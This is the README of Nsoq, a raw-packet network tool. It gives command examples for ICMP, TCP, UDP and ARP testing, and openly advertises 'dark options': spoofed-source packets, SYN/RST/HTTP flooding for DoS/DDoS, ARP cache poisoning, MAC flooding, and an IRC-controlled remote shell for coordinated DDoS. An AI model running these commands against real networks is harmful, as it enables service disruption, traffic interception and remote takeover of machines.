Nsoq official documentation: See [here.](http://www.nsoq.org)
========================================================================


## About
--------

   Nsoq is a Network Security tool for raw packets manipulation that allows a
   large number of options. Its primary purpose is analyze and test several 
   scenarios of TCP/IP environments, such TCP/UDP packets and low levels 
   ARP/RARP packets.<BR/>
   Nsoq can send packets to any target type (like hostnames, IPs and MAC address)
   like handling many fields/headers like: Source/Destination IP address,
   Source/Destination MAC address, TCP flags, ICMP types, TCP/UDP/ICMP packet
   size, payloads ARP/RARP, etc.

   Nsoq is able to operate into the RSOI mode (Remote System over IRC), where 
   the tool can surrender all control of machine resources to some specific IRC
   channel, also called Hive Mind option.
   
   Nsoq exeutes sistematically many types of network based attacks, like packet
   attacks, MAC/IP Spoofing, DoS/DDoS attacks, ARP Poison, MAC Flooding and
   Web Stress Testing.

<BR/>

## Features
-----------

#### Some white options:
- Sends and checks many ICMP packet types: Echo Request, Mask Reply, Information Request, Source Quench, etc.
- Sends and checks the TCP packet headers: bit SYN, ACK, RST, FIN, PUSH , XMAS e NULL FLAGS.
- Server/Client TCP. Also checks TCP packet headers (tcpdump style).
- Check and sends UDP packets.
- Sends and checks ARP/RARP packets (enlace layer).
- [Listen Modes] Listen ICMP, UDP, TCP (packets or connections) and ARP/RARP.
- Threads handler on all modes.
- Sets packet size for all modes.
- Show a packet dump on listen modes (tcpdump style).
- [RSOI mode] Delivers a remote shell under IRC channels (IRCp protocol).
- FTP handler (I/O bound connections like netcat style).
- Arping mode. Sends ARP replies instead of ICMP ping (bypass ICMP ping).

#### Dark Options:
- [DoS/DDoS Attack] WEB Stress HTTP test.
- [DoS/DDoS Attack] WEB Stress TCP test.
- [DoS/DDoS Attack] WEB Stress UDP test.
- [DoS/DDoS Attack] WEB Stress ICMP test.
- [DoS/DDoS Attack] WEB Stress SYN test.
- [DoS/DDoS Attack] WEB Stress ACK test.
- [HIVE MIND] Surrenders remote control of the machine resources to an IRC channel across a remote shell (RSOI mode).
- MAC e IP spoofing.
- [HIVE MIND] Across of an IRC channel, perform a Distributed Denial Of Service (DDoS) attack.
- [ARP Poisoning Attack] Changes the ARP cache table of network neighbors (CAUTION).
- [MAC Flooding Attack] ARP Flooding with MAC/IP address randomly crafted (CAUTION).

<BR/>

##EXAMPLES
-----------

```
   # nsoq -d hexcodes -Ie
      Sends an ICMP packet (Echo Request) to host "hexcodes".

   # nsoq -lI
      ICMP listen mode. Listen for ICMP packets like PINGs.

   # nsoq -It -d www.nsoq.org -c
      Sends ICMP packets (Timestamp Request) on continuous mode to server 
      "www.nsoq.org".

   # nsoq -s 10.1.100.100 -d www.nsoq.org -u -p 4140
      Sends an empty UDP packet with spoofed source ip "10.1.100.100" to host
      "hexcodes" on port 4140.

   # nsoq -d www.nsoq.org -u -p 9000 -P 22000 -F 900 -q 20
      Sends only 20 UDP packets to server "www.nsoq.org" and to port 9000,
      from source port 22000 with flood Delay of 900 miliseconds.

   # nsoq -d 201.1.0.13 -Ie -x 512 -t 50 -z
      Sets Nsoq for send ICMP packets (Echo Request) with size of 512 bytes 
      to host "201.1.0.13" with TTL 50. Don't wait for ICMP Echo ReplY.

   # nsoq -lU -P 59
      Listen UDP packets on local port 59 (all addresses and loopback).

   # nsoq -d hexcodes -Ts -p 6000
      Sends a TCP SYN packet to host "hexcodes" on port 6000.

   # nsoq -lC -P 12345 > file.txt
      Listen TCP connections on local port "12345", and write the received
      data on file 'file.txt'.

   # nsoq -d hexcodes -p 12345 < /etc/hosts
      Connect to host 'hexcodes' reading the file '/etc/hosts. The file
      content will be send over the TCP connection (netcat style).
   
   # nsoq -lT -P 2134 -D
      Listen for TCP packets on local port "2134" and show the packet content.

   # nsoq -d www.nsoq.org -Tr -p 8080 -n 12 -b
      Sends TCP RST packets to server "www.nsoq.org" on port 8080, with 12
      threads and super flood mode (HOT).

   # nsoq -H FF:FF:FF:FF:FF:FF
      Sends an ARP REPLY packet to physical Broadcast FF:FF:FF:FF:FF:FF. (The
      source MAC address and the source IP address will be obtained locally 
      by the active interface. The destination IP address will be NULL).

   # nsoq -i eth2 -h 00:BB:AA:CC:BB:AA -H FF:FF:FF:FF:FF:FF -d 10.1.10.1 -A
      Sends an ARP REQUEST packet by the eth2 interface with source MAC 
      00:BB:AA:CC:BB:AA, to destination physical Broadcast FF:FF:FF:FF:FF:FF,
      asking "Who ??" on the network have the IP address "10.1.10.1". The IP
      "10.1.10.1" (if alive) will respond with an ARP REPLY filled with its
      own MAC/IP address pair.

   # nsoq -s 10.2.2.100 -h 00:CC:AA:CC:BB:AA -H FF:FF:FF:FF:FF:FF
      Sends an ARP REPLY packet to destination physical Broadcast 
      FF:FF:FF:FF:FF:FF saying that the source IP address "10.2.2.100" have
      now the MAC address 00:CC:AA:CC:BB:AA. (Caution: This option changes
      the ARP cache table. Possible ARP poisoning attack).

   # nsoq -a 10.1.50.100
      Send an Arp'ing packet to Host "10.1.50.100". If the host hardware is
      alive on network or LAN, by default an ARP REPLY will be returned.
      Otherwise, nothing happens. This option can be used to bypass ICMP
      filters (PING filters).

   # nsoq -f 250000
      Send 250000 ARP REPLY packets (to physical broadcast) with the
      fields (SOURCE MAC, DESTINATION MAC, SOURCE IP and DESTINATION IP
      ADDRESSESS) randomly generated.

   # nsoq -lA -D
      Listen for ARP/RARP packets. Does a listen action for all incoming
      ARP/RARP packets on link layer, and show the packet content.

   # nsoq -N irc.quakenet.org -L Cybers
      Sets the Nsoq to connect on IRC Server "irc.quakenet.org" on channel
      #Cybers. This option puts Nsoq on the RSOI mode. So, the Nsoq 
      will be NO AVAILABLE to be controled by user. Only the users on IRC
      server "irc.quakenet.org" channel #Cybers can do this.

   # nsoq -d 10.0.0.1 -W -n 40
      Sets the Nsoq to "WEB Stress Mode". This option puts Nsoq to send HTTP
      requests (GET method) on super flooding mode to host "10.0.0.1" on port
      80 (WEB HTTP) with 40 threads. This stress test attempts to exhaust the
      services on port 80 (Web Server) and check the target's limit response.
```

<BR/>

## SECURITY
-----------

   Nsoq need superuser privileges (root) for operation and execution. DO NOT
   use the stick bit to allow root privilegies. This is not recommended and
   may allow involuntary or agressive DoS/DDoS attacks. The privileged Nsoq
   use also allows users manipulate the ARP cache table of neighbors on
   network, or put the system over a remote control.

<BR/>

## DISPONIBILITY
----------------

   Nsoq is licensed under GPL and Free Software Foundation.<BR/> 
   A copy of the license accompanies the software.<BR/>
   Licensed under GPL 3 - Copyright (C) Felipe Ecker.
   
   Nsoq can be freely downloaded here: 
   [http://www.nsoq.org](http://www.nsoq.org)
